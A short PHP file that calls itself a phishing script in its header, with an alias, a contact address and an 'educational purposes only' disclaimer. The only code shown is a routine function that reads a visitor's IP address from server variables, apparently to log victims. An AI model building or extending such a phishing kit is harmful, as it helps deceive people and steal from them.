<?php
/*
-----------------------------------------------------------------------------------
| This script was created by Johnny (not real name)                                |
-----------------------------------------------------------------------------------
| Contact : markzukerber5@gmail.com                                                |
-----------------------------------------------------------------------------------
-----------------------------------------------------------------------------------
|                          DISCLAIMER !                                            |  
|                                                                                  |
-----------------------------------------------------------------------------------
-----------------------------------------------------------------------------------
| I am not responsible if this phishing script gets you in trouble of any kind.    |
-----------------------------------------------------------------------------------

****************IT IS FOR EDUCATIONAL PURPOSES ONLY*******************
*/

function get_ip() {

	// IP if Internet shared

	if (isset($_SERVER['HTTP_CLIENT_IP'])) {

		return $_SERVER['HTTP_CLIENT_IP'];

	}

	// IP if proxy used

	elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {

		return $_SERVER['HTTP_X_FORWARDED_FOR'];

	}

	// Normal IP

	else {

		return (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '');

	}

}

?>

